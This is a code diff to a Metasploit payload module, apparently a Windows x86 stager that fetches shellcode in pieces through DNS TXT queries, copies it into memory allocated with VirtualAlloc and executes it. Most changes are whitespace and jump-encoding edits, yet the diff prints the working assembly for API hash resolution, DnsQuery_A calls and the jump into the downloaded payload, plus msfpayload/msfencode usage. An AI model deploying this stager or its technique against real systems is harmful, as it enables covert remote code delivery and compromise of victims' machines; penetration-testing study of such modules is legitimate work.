@@ -21,12 +21,11 @@ module Metasploit3
 					'corelanc0d3r <peter.ve[at]corelan.be>'
 				],
 			'License'       => MSF_LICENSE,
-			'Version'       => "$Revision$",
 			'Platform'      => 'win',
 			'Arch'          => ARCH_X86
 		))
 
-		# EXITFUNC is not supported 
+		# EXITFUNC is not supported
 		deregister_options('EXITFUNC')
 
 		# Register command execution options
@@ -36,11 +35,11 @@ module Metasploit3
 			], self.class)
 	end
 
-	# 
+	#
 	# Usage :
-	# 1. Generate the shellcode you want to deliver via DNS TXT queries 
+	# 1. Generate the shellcode you want to deliver via DNS TXT queries
 	#    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister
-	#    Example : 
+	#    Example :
 	#   ./msfpayload windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" R | ./msfencode -e x86/alpha_mixed Bufferregister=EDI -t raw
 	#    Output : 654 bytes
 	# 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)
@@ -89,7 +88,7 @@ api_call:
 	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
 next_mod:
 	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
-	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
+	movzx ecx, word [edx+38] ; Set ECX to the length we want to check
 	xor edi, edi           ; Clear EDI which will store the hash of the module name
 loop_modname:            ;
 	xor eax, eax           ; Clear EAX
@@ -104,7 +103,7 @@ not_lowercase:           ;
 	; We now have the module hash computed
 	push edx               ; Save the current position in the module list for later
 	push edi               ; Save the current module hash for later
-	; Proceed to iterate the export address table, 
+	; Proceed to iterate the export address table,
 	mov edx, [edx+16]      ; Get this modules base address
 	mov eax, [edx+60]      ; Get PE header
 	add eax, edx           ; Add the modules base address
@@ -113,7 +112,7 @@ not_lowercase:           ;
 	jz get_next_mod1       ; If no EAT present, process the next module
 	add eax, edx           ; Add the modules base address
 	push eax               ; Save the current modules EAT
-	mov ecx, [eax+24]      ; Get the number of function names  
+	mov ecx, [eax+24]      ; Get the number of function names
 	mov ebx, [eax+32]      ; Get the rva of the function names
 	add ebx, edx           ; Add the modules base address
 	; Computing the module hash + function hash
@@ -132,14 +131,14 @@ loop_funcname:           ;
 	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
 	jne loop_funcname      ; If we have not reached the null terminator, continue
 	add edi, [ebp-8]       ; Add the current module hash to the function hash
-	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
+	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
 	jnz get_next_func      ; Go compute the next function hash if we have not found it
 	; If found, fix up stack, call the function and then value else compute the next one...
 	pop eax                ; Restore the current modules EAT
-	mov ebx, [eax+36]      ; Get the ordinal table rva      
+	mov ebx, [eax+36]      ; Get the ordinal table rva
 	add ebx, edx           ; Add the modules base address
 	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
-	mov ebx, [eax+28]      ; Get the function addresses table rva  
+	mov ebx, [eax+28]      ; Get the function addresses table rva
 	add ebx, edx           ; Add the modules base address
 	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
 	add eax, edx           ; Add the modules base address to get the functions actual VA
@@ -160,7 +159,7 @@ get_next_mod1:           ;
 	pop edi                ; Pop off the current (now the previous) modules hash
 	pop edx                ; Restore our position in the module list
 	mov edx, [edx]         ; Get the next module
-	jmp next_mod           ; Process this module
+	jmp.i8 next_mod        ; Process this module
 
 ; actual routine
 start:
@@ -175,7 +174,7 @@ alloc_space:
 	push eax		; dwSize (0x1000)
 	push 0x0		; lpAddress
 	push 0xE553A458        	; kernel32.dll!VirtualAlloc
-	call ebp 
+	call ebp
 	push eax		; save pointer on stack, will be used in memcpy
 	mov #{bufferreg}, eax	; save pointer, to jump to at the end
 
@@ -192,10 +191,10 @@ load_dnsapi:
 	call ebp               	; LoadLibraryA( "dnsapi" )
 
 ;prepare for loop of queries
-	mov bl,0x61		; first query, start with 'a' 
+	mov bl,0x61		; first query, start with 'a'
 
 dnsquery:
-	jmp get_dnsname		; get dnsname
+	jmp.i8 get_dnsname	; get dnsname
 
 get_dnsname_return:
 	pop eax			; get ptr to dnsname (lpstrName)
@@ -212,10 +211,10 @@ get_dnsname_return:
 	push #{wType}		; wType
 	push eax		; lpstrName
 	push 0xC99CC96A 	; dnsapi.dll!DnsQuery_A
-	call ebp		; 
+	call ebp		;
 	test eax, eax		; query ok ?
 	jnz jump_to_payload	; no, jump to payload
-	jmp get_query_result	; eax = 0 : a piece returned, fetch it
+	jmp.i8 get_query_result	; eax = 0 : a piece returned, fetch it
 
 
 get_dnsname:
@@ -225,9 +224,9 @@ get_dnsname:
 get_query_result:
 	xchg #{bufferreg},edx	; save start of heap
 	pop #{bufferreg}	; heap structure containing DNS results
-	mov eax,[#{bufferreg}]	; if first dword has a non-null value, then stop
-	test eax,eax
-	jnz prepare_payload	; jmp to payload
+	mov eax,[#{bufferreg}+0x18]	; check if value at offset 0x18 is 0x1
+	cmp eax,1
+	jne prepare_payload	; jmp to payload
 	add #{bufferreg},#{wTypeOffset}	; get ptr to ptr to DNS reply
 	mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply
 
@@ -240,10 +239,10 @@ copy_piece_to_heap:
 	rep movsb		; copy from ESI to EDI
 	push edi		; save target for next copy
 	push edi		; 2 more times to make sure it's at esp+8
-	push edi		; 
+	push edi		;
 	inc ebx			; increment sequence
 	xchg #{bufferreg},edx	; restore start of heap
-	jmp dnsquery		; try to get the next piece, if any
+	jmp.i8 dnsquery	        ; try to get the next piece, if any
 
 prepare_payload:
 	mov #{bufferreg},edx
@@ -254,6 +253,7 @@ jump_to_payload:
 
 
 EOS
-		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
+		self.assembly = payload_data
+		super
 	end
 end
